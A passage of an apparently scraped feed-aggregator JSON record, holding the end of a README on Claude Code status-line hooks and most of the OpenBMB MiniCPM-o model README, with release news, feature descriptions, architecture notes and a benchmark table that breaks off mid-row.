\"debugging\",\n    \"environment\": \"prod\"\n  }\n}\n</code></pre> \n<p><strong>Agent Naming:</strong></p> \n<ul> \n <li>Automatically generates unique agent names using LLM services</li> \n <li>Priority: Ollama (local) → Anthropic → OpenAI → Fallback names</li> \n <li>Names are single-word, memorable identifiers (e.g., Phoenix, Sage, Nova)</li> \n <li>Enabled via <code>--name-agent</code> flag in <code>user_prompt_submit.py</code></li> \n</ul> \n<p><strong>Custom Metadata (v4):</strong></p> \n<ul> \n <li>Use <code>/update_status_line</code> command to add custom key-value pairs</li> \n <li>Displayed at the end of the status line in cyan brackets</li> \n <li>Persists across Claude Code interactions</li> \n <li>Example: <code>/update_status_line &lt;session_id&gt; project myapp</code></li> \n</ul> \n<h3>Configuration</h3> \n<p>Set your preferred status line in <code>.claude/settings.json</code>:</p> \n<pre><code class=\"language-json\">{\n  \"statusLine\": {\n    \"type\": \"command\",\n    \"command\": \"uv run $CLAUDE_PROJECT_DIR/.claude/status_lines/status_line_v3.py\"\n  }\n}\n</code></pre> \n<p><strong>Status Line Features:</strong></p> \n<ul> \n <li><strong>Real-time updates</strong> - Refreshes on message changes (300ms throttle)</li> \n <li><strong>Color coding</strong> - Visual indicators for different task types</li> \n <li><strong>Smart truncation</strong> - Manages long prompts elegantly</li> \n <li><strong>Session persistence</strong> - Maintains context across interactions</li> \n</ul> \n<p><strong>Task Type Indicators (v2/v3):</strong></p> \n<ul> \n <li>🔍 Purple - Analysis/search tasks</li> \n <li>💡 Green - Creation/implementation tasks</li> \n <li>🔧 Yellow - Fix/debug tasks</li> \n <li>🗑️ Red - Deletion tasks</li> \n <li>❓ Blue - Questions</li> \n <li>💬 Default - General conversation</li> \n</ul> \n<h2>Master Agentic Coding</h2> \n<blockquote> \n <p>Prepare for the future of software engineering</p> \n</blockquote> \n<p>Learn tactical agentic coding patterns with <a href=\"https://agenticengineer.com/tactical-agentic-coding?y=ssvhooks\">Tactical Agentic Coding</a></p> \n<p>Follow the <a href=\"https://www.youtube.com/@indydevdan\">IndyDevDan YouTube channel</a> to improve your agentic coding advantage.</p>",
        "source": "mshibanami.github.io",
        "published": "",
        "fetched_at": "2026-02-09T23:33:03.745502Z",
        "tags": [
          {
            "name": "transformation",
            "score": 11
          },
          {
            "name": "boundary_crossing",
            "score": 9
          },
          {
            "name": "visibility_gain",
            "score": 5
          },
          {
            "name": "scale_shift",
            "score": 13
          }
        ],
        "structural_score": 38,
        "timeliness_score": 1,
        "final_score": 19.5,
        "reddit_score": null,
        "reddit_comments": null
      },
      {
        "url": "https://github.com/OpenBMB/MiniCPM-o",
        "title": "OpenBMB/MiniCPM-o",
        "summary": "<p>A Gemini 2.5 Flash Level MLLM for Vision, Speech, and Full-Duplex Multimodal Live Streaming on Your Phone</p><hr /><div align=\"center\"> \n <p><img src=\"https://raw.githubusercontent.com/OpenBMB/MiniCPM-o/main/assets/minicpm_v_and_minicpm_o_title.png\" width=\"500em\" /></p> \n <p><strong>A Gemini 2.5 Flash Level MLLM for Vision, Speech, and Full-Duplex Multimodal Live Streaming on Your Phone</strong></p> \n <p><strong><a href=\"https://raw.githubusercontent.com/OpenBMB/MiniCPM-o/main/README_zh.md\">中文</a> | English</strong></p> \n <span style=\"display: inline-flex; margin-right: 2px;\"> <img alt=\"WeChat\" src=\"https://raw.githubusercontent.com/OpenBMB/MiniCPM-o/main/assets/wechat.png\" style=\"margin-right: 4px;\" /> <a href=\"https://raw.githubusercontent.com/OpenBMB/MiniCPM-o/main/docs/wechat.md\" target=\"_blank\"> WeChat</a> &nbsp;| </span> &nbsp; \n <span> <img alt=\"Discord\" src=\"https://raw.githubusercontent.com/OpenBMB/MiniCPM-o/main/assets/discord.png\" style=\"margin-right: 4px;\" /> <a href=\"https://discord.gg/N2RnxGdJ\" target=\"_blank\"> Discord</a> &nbsp; </span> \n <p align=\"center\"> MiniCPM-o 4.5 <a href=\"https://huggingface.co/openbmb/MiniCPM-o-4_5\">🤗</a> <a href=\"https://minicpm-omni.openbmb.cn/\">📞</a> <a href=\"http://211.93.21.133:18121/\">🤖</a> | MiniCPM-V 4.0 <a href=\"https://huggingface.co/openbmb/MiniCPM-V-4\">🤗</a> | <a href=\"https://github.com/OpenSQZ/MiniCPM-V-Cookbook\">🍳 Cookbook</a> </p> \n</div> \n<p><strong>MiniCPM-o</strong> is the latest series of on-device multimodal LLMs (MLLMs) ungraded from MiniCPM-V. The models can now take image, video, text, and audio as inputs and provide high-quality text and speech outputs in an end-to-end fashion. The model series is designed for <strong>strong performance and efficient deployment</strong>. The most notable models in the series currently include:</p> \n<ul> \n <li> <p><strong>MiniCPM-o 4.5</strong>: 🔥🔥🔥 The latest and most capable model in the series. With a total of 9B parameters, this end-to-end model <strong>approaches Gemini 2.5 Flash in vision, speech, and full-duplex multimodal live streaming</strong>, making it one of the most versatile and performant models in the open-source community. The new full-duplex multimodal live streaming capability means that the output streams (speech and text), and the real-time input streams (video and audio) do not block each other. This <strong>enables MiniCPM-o 4.5 to see, listen, and speak simultaneously</strong> in a real-time omnimodal conversation, and perform <strong>proactive interactions</strong> such as proactive reminding. The improved voice mode supports bilingual real-time speech conversation in a more natural, expressive, and stable way, and also allows for voice cloning. It also advances MiniCPM-V's visual capabilities such as strong OCR capability, trustworthy behavior and multilingual support, etc. We also rollout a <strong>high-performing llama.cpp-omni inference framework together with a WebRTC Demo</strong>, to bring this full-duplex multimodal live streaming experience <a href=\"https://github.com/OpenSQZ/MiniCPM-V-CookBook/raw/main/demo/web_demo/WebRTC_Demo/README.md\">available on local devices such as Macs</a>.</p> </li> \n <li> <p><strong>MiniCPM-V 4.0</strong>: ⭐️⭐️⭐️ An efficient model in the MiniCPM-V series. With a total of 4B parameters, the model surpasses GPT-4.1-mini-20250414 in image understanding on the OpenCompass evaluation. With its small parameter-size and efficient architecure, MiniCPM-V 4.0 is an ideal choice for on-device deployment on the phone.</p> </li> \n</ul> \n<h2>News \n <!-- omit in toc --></h2> \n<h4>📌 Pinned</h4> \n<blockquote> \n <p>[!NOTE] [2026.02.06] 🥳 🥳 🥳 MiniCPM-o 4.5 Local &amp; Ready-to-Run! Experience <strong>low-latency full-duplex communication</strong> directly <strong>on your own Mac</strong> using our new official Docker image. <a href=\"https://github.com/OpenSQZ/MiniCPM-V-CookBook/raw/main/demo/web_demo/WebRTC_Demo/README.md\">Try it now</a>!</p> \n</blockquote> \n<ul> \n <li> <p>[2026.02.05] 📢📢📢 We note the web demo may experience latency issues due to network conditions. We are&nbsp;working actively&nbsp;to provide a Docker&nbsp;image for local deployment of the real-time interactive Demo as&nbsp;soon as possible. Please stay tuned!</p> </li> \n <li> <p>[2026.02.03] 🔥🔥🔥 We open-source MiniCPM-o 4.5, which matches Gemini 2.5 Flash on vision and speech, and supports full-duplex multimodal live streaming. Try it now!</p> </li> \n <li> <p>[2025.09.18] 📢📢📢 MiniCPM-V 4.5 technical report is now released! See <a href=\"https://raw.githubusercontent.com/OpenBMB/MiniCPM-o/main/docs/MiniCPM_V_4_5_Technical_Report.pdf\">here</a>.</p> </li> \n <li> <p>[2025.08.26] 🔥🔥🔥 We open-source MiniCPM-V 4.5, which outperforms GPT-4o-latest, Gemini-2.0 Pro, and Qwen2.5-VL 72B. It advances popular capabilities of MiniCPM-V, and brings useful new features. Try it now!</p> </li> \n <li> <p>[2025.08.01] ⭐️⭐️⭐️ We open-sourced the <a href=\"https://github.com/OpenSQZ/MiniCPM-V-CookBook\">MiniCPM-V &amp; o Cookbook</a>! It provides comprehensive guides for diverse user scenarios, paired with our new <a href=\"https://minicpm-o.readthedocs.io/en/latest/index.html\">Docs Site</a> for smoother onboarding.</p> </li> \n <li> <p>[2025.03.01] 🚀🚀🚀 RLAIF-V, the alignment technique of MiniCPM-o, is accepted by CVPR 2025 Highlights！The <a href=\"https://github.com/RLHF-V/RLAIF-V\">code</a>, <a href=\"https://huggingface.co/datasets/openbmb/RLAIF-V-Dataset\">dataset</a>, <a href=\"https://arxiv.org/abs/2405.17220\">paper</a> are open-sourced!</p> </li> \n <li> <p>[2025.01.24] 📢📢📢 MiniCPM-o 2.6 technical report is released! See <a href=\"https://openbmb.notion.site/MiniCPM-o-2-6-A-GPT-4o-Level-MLLM-for-Vision-Speech-and-Multimodal-Live-Streaming-on-Your-Phone-185ede1b7a558042b5d5e45e6b237da9\">here</a>.</p> </li> \n <li> <p>[2025.01.19] ⭐️⭐️⭐️ MiniCPM-o tops GitHub Trending and reaches top-2 on Hugging Face Trending!</p> </li> \n <li> <p>[2024.05.23] 🔥🔥🔥 MiniCPM-V tops GitHub Trending and Hugging Face Trending! Our demo, recommended by Hugging Face Gradio’s official account, is available <a href=\"https://huggingface.co/spaces/openbmb/MiniCPM-Llama3-V-2_5\">here</a>. Come and try it out!</p> </li> \n</ul> \n<br /> \n<details> \n Click to view more news. \n <ul> \n  <li> <p>[2025.09.01] ⭐️⭐️⭐️ MiniCPM-V 4.5 has been officially supported by <a href=\"https://github.com/ggml-org/llama.cpp/pull/15575\">llama.cpp</a>, <a href=\"https://github.com/vllm-project/vllm/pull/23586\">vLLM</a>, and <a href=\"https://github.com/hiyouga/LLaMA-Factory/pull/9022\">LLaMA-Factory</a>. You are welcome to use it directly through these official channels! Support for additional frameworks such as <a href=\"https://github.com/ollama/ollama/pull/12078\">Ollama</a> and <a href=\"https://github.com/sgl-project/sglang/pull/9610\">SGLang</a> is actively in progress.</p> </li> \n  <li> <p>[2025.08.02] 🚀🚀🚀 We open-source MiniCPM-V 4.0, which outperforms GPT-4.1-mini-20250414 in image understanding. It advances popular features of MiniCPM-V 2.6, and largely improves the efficiency. We also open-source the iOS App on iPhone and iPad. Try it now!</p> </li> \n  <li> <p>[2025.06.20] ⭐️⭐️⭐️ Our official <a href=\"https://ollama.com/openbmb\">Ollama repository</a> is released. Try our latest models with <a href=\"https://ollama.com/openbmb/minicpm-o2.6\">one click</a>！</p> </li> \n  <li> <p>[2025.01.23] 💡💡💡 MiniCPM-o 2.6 is now supported by <a href=\"https://github.com/PKU-Alignment/align-anything\">Align-Anything</a>, a framework by PKU-Alignment Team for aligning any-to-any modality large models with human intentions. It supports DPO and SFT fine-tuning on both vision and audio. Try it now!</p> </li> \n  <li> <p>[2025.01.19] 📢 <strong>ATTENTION!</strong> We are currently working on merging MiniCPM-o 2.6 into the official repositories of llama.cpp, Ollama, and vllm. Until the merge is complete, please USE OUR LOCAL FORKS of <a href=\"https://github.com/OpenBMB/llama.cpp/raw/minicpm-omni/examples/llava/README-minicpmo2.6.md\">llama.cpp</a>, <a href=\"https://github.com/OpenBMB/ollama/raw/minicpm-v2.6/examples/minicpm-v2.6/README.md\">Ollama</a>, and <a href=\"https://github.com/OpenBMB/MiniCPM-o?tab=readme-ov-file#efficient-inference-with-llamacpp-ollama-vllm\">vllm</a>. <strong>Using the official repositories before the merge may lead to unexpected issues</strong>.</p> </li> \n  <li> <p>[2025.01.17] We have updated the usage of MiniCPM-o 2.6 int4 quantization version and resolved the model initialization error. Click <a href=\"https://huggingface.co/openbmb/MiniCPM-o-2_6-int4\">here</a> and try it now!</p> </li> \n  <li> <p>[2025.01.13] 🔥🔥🔥 We open-source MiniCPM-o 2.6, which matches GPT-4o-202405 on vision, speech and multimodal live streaming. It advances popular capabilities of MiniCPM-V 2.6, and supports various new fun features. Try it now!</p> </li> \n  <li> <p>[2024.08.15] We now also support multi-image SFT. For more details, please refer to the <a href=\"https://github.com/OpenBMB/MiniCPM-V/tree/main/finetune\">document</a>.</p> </li> \n  <li> <p>[2024.08.14] MiniCPM-V 2.6 now also supports <a href=\"https://github.com/modelscope/ms-swift/issues/1613\">fine-tuning</a> with the SWIFT framework!</p> </li> \n  <li> <p>[2024.08.17] 🚀🚀🚀 MiniCPM-V 2.6 is now fully supported by <a href=\"https://github.com/ggerganov/llama.cpp\">official</a> llama.cpp! GGUF models of various sizes are available <a href=\"https://huggingface.co/openbmb/MiniCPM-V-2_6-gguf\">here</a>.</p> </li> \n  <li> <p>[2024.08.10] 🚀🚀🚀 MiniCPM-Llama3-V 2.5 is now fully supported by <a href=\"https://github.com/ggerganov/llama.cpp\">official</a> llama.cpp! GGUF models of various sizes are available <a href=\"https://huggingface.co/openbmb/MiniCPM-Llama3-V-2_5-gguf\">here</a>.</p> </li> \n  <li> <p>[2024.08.06] 🔥🔥🔥 We open-source MiniCPM-V 2.6, which outperforms GPT-4V on single image, multi-image and video understanding. It advances popular features of MiniCPM-Llama3-V 2.5, and can support real-time video understanding on iPad. Try it now!</p> </li> \n  <li> <p>[2024.08.03] MiniCPM-Llama3-V 2.5 technical report is released! See <a href=\"https://arxiv.org/abs/2408.01800\">here</a>.</p> </li> \n  <li> <p>[2024.07.19] MiniCPM-Llama3-V 2.5 supports vLLM now! See <a href=\"https://raw.githubusercontent.com/OpenBMB/MiniCPM-o/main/#inference-with-vllm\">here</a>.</p> </li> \n  <li> <p>[2024.06.03] Now, you can run MiniCPM-Llama3-V 2.5 on multiple low VRAM GPUs(12 GB or 16 GB) by distributing the model's layers across multiple GPUs. For more details, check this <a href=\"https://github.com/OpenBMB/MiniCPM-V/raw/main/docs/inference_on_multiple_gpus.md\">link</a>.</p> </li> \n  <li> <p>[2024.05.28] 🚀🚀🚀 MiniCPM-Llama3-V 2.5 now fully supports its feature in llama.cpp and Ollama! Please pull the latest code <strong>of our provided forks</strong> (<a href=\"https://github.com/OpenBMB/llama.cpp/raw/minicpm-v2.5/examples/minicpmv/README.md\">llama.cpp</a>, <a href=\"https://github.com/OpenBMB/ollama/tree/minicpm-v2.5/examples/minicpm-v2.5\">Ollama</a>). GGUF models in various sizes are available <a href=\"https://huggingface.co/openbmb/MiniCPM-Llama3-V-2_5-gguf/tree/main\">here</a>. MiniCPM-Llama3-V 2.5 series is <strong>not supported by the official repositories yet</strong>, and we are working hard to merge PRs. Please stay tuned!</p> </li> \n  <li> <p>[2024.05.28] 💫 We now support LoRA fine-tuning for MiniCPM-Llama3-V 2.5, using only 2 V100 GPUs! See more statistics <a href=\"https://github.com/OpenBMB/MiniCPM-V/tree/main/finetune#model-fine-tuning-memory-usage-statistics\">here</a>.</p> </li> \n  <li> <p>[2024.05.25] MiniCPM-Llama3-V 2.5 now supports streaming outputs and customized system prompts. Try it <a href=\"https://huggingface.co/openbmb/MiniCPM-Llama3-V-2_5#usage\">here</a>!</p> </li> \n  <li> <p>[2024.05.24] We release the MiniCPM-Llama3-V 2.5 <a href=\"https://huggingface.co/openbmb/MiniCPM-Llama3-V-2_5-gguf\">gguf</a>, which supports <a href=\"https://raw.githubusercontent.com/OpenBMB/MiniCPM-o/main/#inference-with-llamacpp\">llama.cpp</a> inference and provides a 6~8 token/s smooth decoding on mobile phones. Try it now!</p> </li> \n  <li> <p>[2024.05.23] 🔍 We've released a comprehensive comparison between Phi-3-vision-128k-instruct and MiniCPM-Llama3-V 2.5, including benchmark evaluations, multilingual capabilities, and inference efficiency 🌟📊🌍🚀. Click <a href=\"https://raw.githubusercontent.com/OpenBMB/MiniCPM-o/main/docs/compare_with_phi-3_vision.md\">here</a> to view more details.</p> </li> \n  <li> <p>[2024.05.20] We open-soure MiniCPM-Llama3-V 2.5, it has improved OCR capability and supports 30+ languages, representing the first end-side MLLM achieving GPT-4V level performance! We provide <a href=\"https://raw.githubusercontent.com/OpenBMB/MiniCPM-o/main/#deployment-on-mobile-phone\">efficient inference</a> and <a href=\"https://raw.githubusercontent.com/OpenBMB/MiniCPM-o/main/finetune/readme.md\">simple fine-tuning</a>. Try it now!</p> </li> \n  <li> <p>[2024.04.23] MiniCPM-V-2.0 supports vLLM now! Click <a href=\"https://raw.githubusercontent.com/OpenBMB/MiniCPM-o/main/#inference-with-vllm\">here</a> to view more details.</p> </li> \n  <li> <p>[2024.04.18] We create a HuggingFace Space to host the demo of MiniCPM-V 2.0 at <a href=\"https://huggingface.co/spaces/openbmb/MiniCPM-V-2\">here</a>!</p> </li> \n  <li> <p>[2024.04.17] MiniCPM-V-2.0 supports deploying <a href=\"https://raw.githubusercontent.com/OpenBMB/MiniCPM-o/main/#webui-demo\">WebUI Demo</a> now!</p> </li> \n  <li> <p>[2024.04.15] MiniCPM-V-2.0 now also supports <a href=\"https://github.com/modelscope/swift/raw/main/docs/source/Multi-Modal/minicpm-v-2%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5.md\">fine-tuning</a> with the SWIFT framework!</p> </li> \n  <li> <p>[2024.04.12] We open-source MiniCPM-V 2.0, which achieves comparable performance with Gemini Pro in understanding scene text and outperforms strong Qwen-VL-Chat 9.6B and Yi-VL 34B on <a href=\"https://rank.opencompass.org.cn/leaderboard-multimodal\">OpenCompass</a>, a comprehensive evaluation over 11 popular benchmarks. Click <a href=\"https://openbmb.vercel.app/minicpm-v-2\">here</a> to view the MiniCPM-V 2.0 technical blog.</p> </li> \n  <li> <p>[2024.03.14] MiniCPM-V now supports <a href=\"https://github.com/modelscope/swift/raw/main/docs/source/Multi-Modal/minicpm-v%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5.md\">fine-tuning</a> with the SWIFT framework. Thanks to <a href=\"https://github.com/Jintao-Huang\">Jintao</a> for the contribution！</p> </li> \n  <li> <p>[2024.03.01] MiniCPM-V can now be deployed on Mac!</p> </li> \n  <li> <p>[2024.02.01] We open-source MiniCPM-V and OmniLMM-12B, which support efficient end-side deployment and powerful multimodal capabilities correspondingly.</p> </li> \n </ul> \n</details> \n<h2>Contents \n <!-- omit in toc --></h2> \n<ul> \n <li><a href=\"https://raw.githubusercontent.com/OpenBMB/MiniCPM-o/main/#minicpm-o-45\">MiniCPM-o 4.5</a></li> \n <li><a href=\"https://raw.githubusercontent.com/OpenBMB/MiniCPM-o/main/#minicpm-v-40\">MiniCPM-V 4.0</a></li> \n <li><a href=\"https://raw.githubusercontent.com/OpenBMB/MiniCPM-o/main/#minicpm-v--o-cookbook\">MiniCPM-V &amp; o Cookbook</a></li> \n <li><a href=\"https://raw.githubusercontent.com/OpenBMB/MiniCPM-o/main/#model-zoo\">Model Zoo</a></li> \n <li><a href=\"https://raw.githubusercontent.com/OpenBMB/MiniCPM-o/main/#local-interactive-demo\">Local Interactive Demo</a></li> \n <li><a href=\"https://raw.githubusercontent.com/OpenBMB/MiniCPM-o/main/#inference-with-transformers\">Inference with Transformers</a> \n  <ul> \n   <li><a href=\"https://raw.githubusercontent.com/OpenBMB/MiniCPM-o/main/#model-initialization\">Model Initialization</a></li> \n   <li><a href=\"https://raw.githubusercontent.com/OpenBMB/MiniCPM-o/main/#duplex-omni-mode\">Duplex Omni Mode</a></li> \n   <li><a href=\"https://raw.githubusercontent.com/OpenBMB/MiniCPM-o/main/#simplex-omni-mode\">Simplex Omni Mode</a></li> \n   <li><a href=\"https://raw.githubusercontent.com/OpenBMB/MiniCPM-o/main/#simplex-realtime-speech-conversation-mode\">Simplex Realtime Speech Conversation Mode</a></li> \n   <li><a href=\"https://raw.githubusercontent.com/OpenBMB/MiniCPM-o/main/#visual-understanding\">Visual Understanding</a></li> \n   <li><a href=\"https://raw.githubusercontent.com/OpenBMB/MiniCPM-o/main/#structured-content-input\">Structured Content Input</a></li> \n  </ul> </li> \n <li><a href=\"https://raw.githubusercontent.com/OpenBMB/MiniCPM-o/main/#supported-frameworks\">Supported Frameworks</a> \n  <ul> \n   <li><a href=\"https://raw.githubusercontent.com/OpenBMB/MiniCPM-o/main/#flagos\">FlagOS</a></li> \n   <li><a href=\"https://raw.githubusercontent.com/OpenBMB/MiniCPM-o/main/#vllm-sglang-llamacpp-ollama\">vLLM, SGLang, llama.cpp, Ollama</a></li> \n   <li><a href=\"https://raw.githubusercontent.com/OpenBMB/MiniCPM-o/main/#llama-factory-swift\">LLaMA-Factory, SWIFT</a></li> \n  </ul> </li> \n <li><a href=\"https://raw.githubusercontent.com/OpenBMB/MiniCPM-o/main/#awesome-work-using-minicpm-v--minicpm-o\">Awesome work using MiniCPM-V &amp; MiniCPM-o</a></li> \n <li><a href=\"https://raw.githubusercontent.com/OpenBMB/MiniCPM-o/main/#limitations\">Limitations</a></li> \n <li><a href=\"https://raw.githubusercontent.com/OpenBMB/MiniCPM-o/main/#acknowledgements\">Acknowledgements</a></li> \n</ul> \n<h2>MiniCPM-o 4.5</h2> \n<p><strong>MiniCPM-o 4.5</strong> is the latest and most capable model in the MiniCPM-o series. The model is built in an end-to-end fashion based on SigLip2, Whisper-medium, CosyVoice2, and Qwen3-8B with a total of 9B parameters. It exhibits a significant performance improvement, and introduces new features for full-duplex multimodal live streaming. Notable features of MiniCPM-o 4.5 include:</p> \n<ul> \n <li> <p>🔥 <strong>Leading Visual Capability.</strong> MiniCPM-o 4.5 achieves an average score of 77.6 on OpenCompass, a comprehensive evaluation of 8 popular benchmarks. <strong>With only 9B parameters, it surpasses widely used proprietary models like GPT-4o, Gemini 2.0 Pro, and approaches Gemini 2.5 Flash</strong> for vision-language capabilities. It supports instruct and thinking modes in a single model, better covering efficiency and performance trade-offs in different user scenarios.</p> </li> \n <li> <p>🎙 <strong>Strong Speech Capability.</strong> MiniCPM-o 4.5 supports <strong>bilingual real-time speech conversation with configurable voices</strong> in English and Chinese. It features <strong>more natural, expressive and stable speech conversation</strong>. The model also allows for fun features such as <strong>voice cloning and role play via a simple reference audio clip</strong>, where the cloning performance surpasses strong TTS tools such as CosyVoice2.</p> </li> \n <li> <p>🎬 <strong>New Full-Duplex and Proactive Multimodal Live Streaming Capability.</strong> As a new feature, MiniCPM-o 4.5 can process real-time, continuous video and audio input streams simultaneously while generating concurrent text and speech output streams in an end-to-end fashion, without mutual blocking. This <strong>allows MiniCPM-o 4.5 to see, listen, and speak simultaneously</strong>, creating a fluid, real-time omnimodal conversation experience. Beyond reactive responses, the model can also perform <strong>proactive interaction</strong>, such as initiating reminders or comments based on its continuous understanding of the live scene.</p> </li> \n <li> <p>💪 <strong>Strong OCR Capability, Efficiency and Others.</strong> Advancing popular visual capabilities from MiniCPM-V series, MiniCPM-o 4.5 can process <strong>high-resolution images</strong> (up to 1.8 million pixels) and <strong>high-FPS videos</strong> (up to 10fps) in any aspect ratio efficiently. It achieves <strong>state-of-the-art peformance for end-to-end English document parsing</strong> on OmniDocBench, outperforming proprietary models such as Gemini-3 Flash and GPT-5, and specialized tools such as DeepSeek-OCR 2. It also features <strong>trustworthy behaviors</strong>, matching Gemini 2.5 Flash on MMHal-Bench, and supports <strong>multilingual capabilities</strong> on more than 30 languages.</p> </li> \n <li> <p>💫 <strong>Easy Usage.</strong> MiniCPM-o 4.5 can be easily used in various ways: (1) <a href=\"https://github.com/OpenSQZ/MiniCPM-V-CookBook/raw/main/deployment/llama.cpp/minicpm-o4_5_llamacpp.md\">llama.cpp</a> and <a href=\"https://github.com/OpenSQZ/MiniCPM-V-CookBook/raw/main/deployment/ollama/minicpm-o4_5_ollama.md\">Ollama</a> support for efficient CPU inference on local devices, (2) <a href=\"https://github.com/OpenSQZ/MiniCPM-V-CookBook/raw/main/quantization/awq/minicpm-o4_5_awq_quantize.md\">int4</a> and <a href=\"https://github.com/OpenSQZ/MiniCPM-V-CookBook/raw/main/quantization/gguf/minicpm-o4_5_gguf_quantize.md\">GGUF</a> format quantized models in 16 sizes, (3) <a href=\"https://github.com/OpenSQZ/MiniCPM-V-CookBook/raw/main/deployment/vllm/minicpm-o4_5_vllm.md\">vLLM</a> and <a href=\"https://github.com/OpenSQZ/MiniCPM-V-CookBook/raw/main/deployment/sglang/MiniCPM-o4_5_sglang.md\">SGLang</a> support for high-throughput and memory-efficient inference, (4) <a href=\"https://raw.githubusercontent.com/OpenBMB/MiniCPM-o/main/#flagos\">FlagOS</a> support for the unified multi-chip backend plugin, (5) fine-tuning on new domains and tasks with <a href=\"https://github.com/OpenSQZ/MiniCPM-V-CookBook/raw/main/finetune/llama-factory/finetune_llamafactory.md\">LLaMA-Factory</a>, and (6) online web demo on <a href=\"https://github.com/OpenSQZ/MiniCPM-V-CookBook/raw/main/demo/web_demo/gradio/README_o45.md\">server</a>. We also rollout a high-performing <a href=\"https://github.com/tc-mb/llama.cpp-omni\">llama.cpp-omni</a> inference framework together with a <a href=\"https://minicpm-omni.openbmb.cn/\">WebRTC Demo</a>, which <strong>enables the full-duplex multimodal live streaming experience on local devices</strong> such as <a href=\"https://github.com/tc-mb/llama.cpp-omni/raw/master/README.md\">PCs</a> (e.g., on a MacBook).</p> </li> \n</ul> \n<p><strong>Model Architecture.</strong></p> \n<ul> \n <li><strong>End-to-end Omni-modal Architecture.</strong> The modality encoders/decoders and LLM are densely connected via hidden states in an end-to-end fashion. This enables better information flow and control, and also facilitates full exploitation of rich multimodal knowledge during training.</li> \n <li><strong>Full-Duplex Omni-modal Live Streaming Mechanism.</strong> (1) We turn the offline modality encoder/decoders into online and full-duplex ones for streaming inputs/outputs. The speech token decoder models text and speech tokens in an interleaved fashion to support full-duplex speech generation (i.e., sync timely with new input). This also facilitates more stable long speech generation (e.g., &gt; 1min). (2) <strong>We sync all the input and output streams on timeline in milliseconds</strong>, which are jointly modeled by a time-division multiplexing (TDM) mechanism for omni-modality streaming processing in the LLM backbone. It divides parallel omni-modality streams into sequential info groups within small periodic time slices.</li> \n <li><strong>Proactive Interaction Mechanism.</strong> The LLM continuously monitors the input video and audio streams, and decides at a frequency of 1Hz to speak or not. This high decision-making frequency together with full-duplex nature are curcial to enable the proactive interaction capability.</li> \n <li><strong>Configurable Speech Modeling Design.</strong> We inherent the multimodal system prompt design of MiniCPM-o 2.6, which includes a traditional text system prompt, and a new audio system prompt to determine the assistant voice. This enables cloning new voices and role play in inference time for speech conversation.</li> \n</ul> \n<div align=\"center\"> \n <img src=\"https://raw.githubusercontent.com/OpenBMB/MiniCPM-o/main/assets/minicpm-o-45-framework.png\" /> \n</div> \n<h3>Evaluation \n <!-- omit in toc --></h3> \n<div align=\"center\"> \n <img src=\"https://raw.githubusercontent.com/OpenBMB/MiniCPM-o/main/assets/radar_minicpmo4.5.png\" /> \n</div> \n<div align=\"center\"> \n <img src=\"https://raw.githubusercontent.com/OpenBMB/MiniCPM-o/main/assets/minicpm_o_45_main_exp_table.png\" /> \n</div> \n<strong>Note</strong>: Scores marked with ∗ are from our evaluation; others are cited from referenced reports. n/a indicates that the model does not support the corresponding modality. All results are reported in instruct mode/variant. \n<p>  <br /></p> \n<details> \n Click to view visual understanding results. \n <p><strong>Image Understanding (Instruct)</strong></p> \n <div align=\"center\"> \n  <table style=\"margin: 0px auto;\"> \n   <tbody>\n    <tr> \n     <th align=\"left\" nowrap=\"nowrap\"><b>Model</b></th> \n     <th nowrap=\"nowrap\"><b>OpenCompass</b></th> \n     <th nowrap=\"nowrap\"><b>MMBench EN v1.1</b></th> \n     <th nowrap=\"nowrap\"><b>MMBench CN v1.1</b></th> \n     <th nowrap=\"nowrap\"><b>MathVista</b></th> \n     <th nowrap=\"nowrap\"><b>MMVet</b></th> \n     <th nowrap=\"nowrap\"><b>MMMU</b></th> \n     <th nowrap=\"nowrap\"><b>MMStar</b></th> \n     <th nowrap=\"nowrap\"><b>HallusionBench</b></th> \n     <th nowrap=\"nowrap\"><b>AI2D</b></th> \n     <th nowrap=\"nowrap\"><b>OCRBench</b></th> \n     <th nowrap=\"nowrap\"><b>TextVQA_VAL</b></th> \n     <th nowrap=\"nowrap\"><b>DocVQA_VAL</b></th> \n     <th nowrap=\"nowrap\"><b>MMT-Bench_VAL</b></th> \n     <th nowrap=\"nowrap\"><b>MM-IFEval</b></th> \n     <th nowrap=\"nowrap\"><b>Mantis-Eval</b></th> \n     <th nowrap=\"nowrap\"><b>MuirBench</b></th> \n     <th nowrap=\"nowrap\"><b>MMSI-Bench</b></th> \n     <th nowrap=\"nowrap\"><b>MMHal-Score</b></th> \n     <th nowrap=\"nowrap\"><b>MMHal-Hallrate↓</b></th> \n    </tr> \n    <tr> \n     <td align=\"left\" nowrap=\"nowrap\">Gemini2.5-Flash-Nonthinking</td> \n     <td align=\"center\"><b>78.5</b></td> \n     <td align=\"center\"><ins>86.6</ins></td> \n     <td align=\"center\"><ins>86.0</ins></td> \n     <td align=\"center\">75.3</td> \n     <td align=\"center\"><ins>81.4</ins><sup>*</sup></td> \n     <td align=\"center\"><b>76.3</b></td> \n     <td align=\"center\"><b>75.8</b></td> \n     <td align=\"center\">59.1</td> \n     <td align=\"center\"><b>87.7</b></td> \n     <td align=\"center\">864</td> \n     <td align=\"center\">74.3<sup>*</sup></td> \n     <td align=\"center\">93.0</td> \n     <td align=\"center\"><ins>70.0</ins><sup>*</sup></td> \n     <td align=\"center\"><b>75.8<sup>*</sup></b></td> \n     <td align=\"center\">72.8<sup>*</sup></td> \n     <td align=\"center\"><b>74.5<sup>*</sup></b></td> \n     <td align=\"center\">12.1<sup>*</sup></td> \n     <td align=\"center\"><ins>4.6</ins><sup>*</sup></td> \n     <td align=\"center\"><b>23.9<sup>*</sup></b></td> \n    </tr> \n    <tr> \n     <td align=\"left\" nowrap=\"nowrap\">Gemini2.0-Pro</td> \n     <td align=\"center\">73.3</td> \n     <td align=\"center\">83.0</td> \n     <td align=\"center\">83.0</td> \n     <td align=\"center\">71.3</td> \n     <td align=\"center\">70.4</td> \n     <td align=\"center\">72.6</td> \n     <td align=\"center\">68.5</td> \n     <td align=\"center\">49.8</td> \n     <td align=\"center\">84.8</td> \n     <td align=\"center\">863</td> \n     <td align=\"center\">-</td> \n     <td align=\"center\">-</td> \n     <td align=\"center\">-</td> \n     <td align=\"center\">-</td> \n     <td align=\"center\">-</td> \n     <td align=\"center\">-</td> \n     <td align=\"center\">-</td> \n     <td align=\"center\">-</td> \n     <td align=\"center\">-</td> \n    </tr> \n    <tr> \n     <td align=\"left\" nowrap=\"nowrap\">GPT-4o</td> \n     <td 